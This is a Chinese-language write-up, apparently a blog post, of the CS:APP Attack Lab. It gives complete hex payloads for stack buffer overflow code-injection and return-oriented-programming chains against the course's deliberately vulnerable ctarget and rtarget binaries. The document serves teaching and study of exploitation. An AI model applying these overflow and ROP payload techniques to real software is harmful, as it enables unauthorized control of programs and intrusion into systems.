# CSAPP Lab -- Attack Lab

## 准备
和[Bomb Lab](https://zhuanlan.zhihu.com/p/36614408)一样，这个实验也是CSAPP中第三章的配套实验，前者主要是利用基础的汇编知识来读汇编代码并解决问题，而Attack Lab则需要弄明白**控制**和**过程**在机器级代码中的表现形式和运行过程。

这个实验分为两个部分，分别是code injection attacks和ROP，这是攻击程序的两种方法。在开始实验之前，可以准备一些资料:
- [lab 下载地址](http://csapp.cs.cmu.edu/3e/labs.html)
- [WriteUp](http://csapp.cs.cmu.edu/3e/attacklab.pdf) <- 很重要
- [cs15213 Attack Lab](http://www.cs.cmu.edu/~213/recitations/recitation04-attacklab.pdf)
- [GDB手册](http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf)

介绍一下，整个Lab的大致流程就是，你输入一个字符串，然后利用stack的buffer overflow，我们就可以修改stack中的数据，然后就可以改变程序的运行，达成我们的目的。具体到这个Lab，我们要完成的目标就是通过`test()`函数中的`getbuf()`这个入口，来完成对stack某些部分的覆盖，利用两种攻击程序的技术，让程序调用我们希望调用的函数。

Like this:
![Alt text](./1526227326162.png)


## Part I : Code Injection Attacks
### level 1
这个部分很简单，要求我们输入一个字符串，利用溢出来重写stack中的getbuf函数ret的地址，让程序调用函数`touch1`。先`objdump -d ctarget.c > ctarget.d`反汇编得到汇编代码。

```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 ac 03 00 00       	callq  401b60 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
```
根据这段代码可以确定，getbuf在栈中分配了0x28bytes的内存来存储输入的字符串。回想一下CSAPP中程序调用时栈的结构，我们会把返回地址存在栈中，然后再去调用函数。如果我们输入的字符串长度超过40，就可以覆盖掉getbuf的返回地址了，所以，我们只需要把输入的第40-47个字符填写为`touch1`函数的地址就OK了。

`touch1`的地址为`00000000004017c0`，按照前面的思路，填写字符串就好了:
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
c0 17 40 00 00 00 00 00
```

这里需要注意的是，我们输入的字符应该用两位十六进制数来表示ascii码，然后通过`./hex2raw`来将其转换成字符串。另外，因为我使用的是ubuntu，数据都是用小端法来保存的，所以低位在前。
![Alt text](./1526228497470.png)

### level 2
和level1相比，level2需要调用的`touch2`函数有一个`unsighed`型的参数，而这个参数就是lab提供的cookie。所以，这次我们在ret到`touch2`之前，需要先把cookie放在寄存器`%rdi`中(第一个参数通过`%rdi`传递)。

为了达到这个目的，我们需要在stack中植入指令`movq $0x59b997fa, %rdi`。所以，考虑在第一次ret的时候，将这个地址写为这条指令的地址，然后再ret到`touch2`。

首先，通过
```
unix> gcc -c example.s
unix> objdump -d example.o > example.d
```
来把指令转换成十六进制的形式，然后放在字符串的开头。这个时候，我们需要得到这个指令在栈中的具体位置，可以用GDB来调试获得:
![Alt text](./1526229018599.png)

所以，将第一次ret的地址写为这个。然后，再把`touch2`的地址放在这后面就行了:
```
bf fa 97 b9 59 c3 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 
ec 17 40 00 00 00 00 00
```

整个流程就是: `getbuf => ret => 0x5561dc78 => movq $0x59b997fa, %rdi => ret => 0x4017ec`。


### level 3

和level2一样，`touch3`也需要传入cookie，但是要求以字符串的形式传入。所以，我们要做的就是，把字符串形式的cookie放在stack中，然后再把它的地址放在`%rdi`中，再就和`touch2`中一样了。

![Alt text](./1526229437211.png)

但是，在这里有一个问题，我们不能够单纯地像level2中那样做，因为touch3中调用了`hexmatch`函数，而这个函数会在栈中申请110bytes的空间，这样有可能将我们在stack中放置的cookie给覆盖掉。

为了解决这样的问题，我们可以考虑将cookie放在更上面的位置，让`hexmatch`够不着，或者直接通过植入指令来修改`%rsp`栈指针的值。

这里采用了第二种方案:
```
fa 18 40 00 00 00 00 00  #touch3的地址
bf 90 dc 61 55 48 83 ec  #mov    edi, 0x5561dc90
30 c3 00 00 00 00 00 00  #sub    rsp, 0x30  ret
35 39 62 39 39 37 66 61  #cookie
00 00 00 00 00 00 00 00
80 dc 61 55				 #stack top的地址+8
```

## Part II: Return-Oriented Programming
### level 2
level2对应Part I中的level2，不同的是，在Part II：
- stack的地址会随机化
- 不能够ret到stack中来执行指令

![Alt text](./1526230071723.png)

在这样的限制下，我们不能使用代码注入的方式来进行攻击了，Write up中介绍了ROP这种方式，大致的思想就是我们把栈中放上很多地址，而每次ret都会到一个Gadget（小的代码片段，并且会ret），这样就可以形成一个程序链。通过将程序自身(`./rtarget`)的指令来完成我们的目的。

Write up提示可以用`movq`, `popq`等来完成这个任务。利用`popq`我们可以把数据从栈中转移到寄存器中，而这个恰好是我们所需要的(将cookie放到`%rdi`中)。

思路确定了，接下来只需要根据Write up提供的encoding table来查找`popq`对应encoding是否在程序中出现了。很容易找到`popq %rdi`对应的编码5f在这里出现，并且下一条就是ret：

```
 402b18:	41 5f                pop    %r15
 402b1a:	c3                   	retq   
```

所以答案就是:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
19 2b 40 00 00 00 00 00 #pop %rdi
fa 97 b9 59 00 00 00 00 #cookie
ec 17 40 00 00 00 00 00 #touch2
```

### level 3
最后一个题就比较麻烦了，因为它需要处理好cookie存放的位置，并且需要找到能够对`%rsp`进行运算，然后保存在`%rdi`中的一系列Gadget。

首先解决第一个问题，因为我们没有实现`sub`操作的可能性，所以cookie只能放到比较高的位置，而不能够通过修改`%rsp`来保护cookie不被覆盖。

然后处理第二个问题，我们必须找到一个能够实现加法或者减法运算的Gadget，这个函数带来了希望:
```
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq 
```

我们可以通过这个函数来实现加法，因为`lea (%rdi,%rsi,1) %rax`就是%rax = %rdi + %rsi。所以，只要能够让%rdi和%rsi其中一个保存%rsp，另一个保存从stack中pop出来的偏移值，就可以表示cookie存放的地址，然后把这个地址mov到`%rdi`就大功告成了。

对应Write up里面的encoding table会发现，从`%rax`并不能直接mov到`%rsi`，而只能通过`%eax`->`%edx`->`%ecx`->`%esi`来完成这个。所以，兵分两路:
- 1.把`%rsp`存放到`%rdi`中
- 2.把偏移值(需要确定指令数后才能确定)存放到`%rsi`中

然后，再用`lea`那条指令把这两个结果的和存放到`%rax`中，再`movq`到`%rdi`中就完成了。

值得注意的是，上面两路完成任务的寄存器不能互换，因为从`%eax`到`%esi`这条路线上面的mov都是4个byte的操作，如果对`%rsp`的值采用这条路线，`%rsp`的值会被截断掉，最后的结果就错了。但是偏移值不会，因为4个bytes足够表示了。

另外，在网上发现了一些其他做法，例如[这篇文章](https://blog.csdn.net/lijun538/article/details/50682387)。在文章中，他的主要思路是利用在这里：
```
00000000004019d6 <add_xy>:
  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:   c3                      retq
```
发现的`04 37`表示`add $0x37, %al`，利用这个直接对`%rax`的值进行修改。但是这种做法是不完全正确的，因为`%al`只表示2个bytes，如果出现溢出的情况，那样计算出来的cookie的地址就是错误的，所以这种方法会有fail的情况发生。


最后结果:
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ad 1a 40 00 00 00 00 00   #movq %rsp, %rax   
a2 19 40 00 00 00 00 00   #movq %rax, %rdi
ab 19 40 00 00 00 00 00   #popq %rax
48 00 00 00 00 00 00 00   #偏移值
dd 19 40 00 00 00 00 00   #mov %eax, %edx
34 1a 40 00 00 00 00 00   #mov %edx, %ecx
13 1a 40 00 00 00 00 00   #mov %ecx, %esi
d6 19 40 00 00 00 00 00   #lea (%rsi, %rdi, 1) %rax
a2 19 40 00 00 00 00 00   #movq %rax, %rdi
fa 18 40 00 00 00 00 00   #touch3
35 39 62 39 39 37 66 61   #cookie
```